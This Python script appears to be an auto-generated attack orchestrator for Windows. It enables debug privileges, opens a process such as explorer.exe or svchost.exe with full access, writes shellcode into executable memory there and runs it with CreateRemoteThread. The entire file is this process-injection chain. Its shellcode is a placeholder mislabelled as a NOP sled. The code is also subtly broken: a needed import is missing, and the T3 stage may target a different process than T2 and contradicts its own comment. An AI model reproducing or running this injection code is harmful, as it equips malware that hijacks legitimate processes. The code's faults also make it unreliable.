#!/usr/bin/env python3
import sys
import json
import time
import ctypes
import psutil
from typing import Dict, Any

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF

# Define necessary Windows API functions and structures
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
VirtualAllocEx.restype = ctypes.wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
WriteProcessMemory.restype = ctypes.wintypes.BOOL

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]
OpenProcess.restype = ctypes.wintypes.HANDLE

def find_target_process() -> int:
    """Find the target process ID based on the specified order."""
    for proc_name in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
        for proc in psutil.process_iter(['name', 'pid']):
            if proc.info['name'].lower() == proc_name:
                return proc.info['pid']
    return None

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        import win32security
        import win32api
        import win32con

        # Open the process token
        process_handle = win32api.GetCurrentProcess()
        token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)

        # Get the LUID for SeDebugPrivilege
        privilege_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)

        # Enable the privilege
        privileges = [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
        win32security.AdjustTokenPrivileges(token_handle, False, privileges)

        # Check if the privilege is enabled
        has_debug = win32security.GetTokenInformation(token_handle, win32security.TokenPrivileges)
        has_debug = any(privilege_id == priv[0] and (priv[1] & win32security.SE_PRIVILEGE_ENABLED) for priv in has_debug)

    except ImportError:
        try:
            import ctypes
            has_debug = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            has_debug = False
    except Exception:
        has_debug = False

    result = {'has_debug': has_debug}
    return {'success': True, 'data': result,
            'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'remote_addr': None, 'success': False}
    
    try:
        # Check if we have debugging privileges
        has_debug = input_data.get('has_debug', False)
        if not has_debug:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Find the target process
        target_pid = find_target_process()
        if target_pid is None:
            target_pid = psutil.Process().pid  # Fallback to current process

        # Open the target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Allocate memory in the target process
        shellcode = bytes.fromhex("fc4883e4f0")  # NOP sled as placeholder shellcode
        remote_addr = VirtualAllocEx(process_handle, None, len(shellcode), 0x3000, 0x40)
        if not remote_addr:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Write shellcode into the allocated memory
        written = ctypes.c_size_t(0)
        if not WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(written)):
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Update result with success and remote address
        result['remote_addr'] = remote_addr
        result['success'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'thread_id': None, 'running': False}
    
    try:
        remote_addr = input_data.get('remote_addr')
        injection_success = input_data.get('success', False)

        if not injection_success:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # Find target process: explorer.exe → notepad.exe → svchost.exe
        target_pid = None
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'svchost.exe':
                target_pid = proc.pid
                break

        if target_pid is None:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == 'notepad.exe':
                    target_pid = proc.pid
                    break

        if target_pid is None:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == 'explorer.exe':
                    target_pid = proc.pid
                    break

        if target_pid is None:
            # Fallback to current process
            target_pid = ctypes.windll.kernel32.GetCurrentProcessId()
            injection_success = False

        # Open the target process
        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # Create a remote thread in the target process
        thread_id = ctypes.c_ulong(0)
        if remote_addr is not None:
            thread_handle = ctypes.windll.kernel32.CreateRemoteThread(
                process_handle, None, 0, remote_addr, None, 0, ctypes.byref(thread_id)
            )
            if thread_handle:
                result['thread_id'] = thread_id.value
                result['running'] = True
                ctypes.windll.kernel32.CloseHandle(thread_handle)

        ctypes.windll.kernel32.CloseHandle(process_handle)

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Acquire Debug Privileges [privilege-escalation] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Acquire Debug Privileges): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Acquire Debug Privileges): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Inject Shellcode [execution] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Inject Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Inject Shellcode): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Execute Injected Shellcode [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Injected Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Injected Shellcode): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))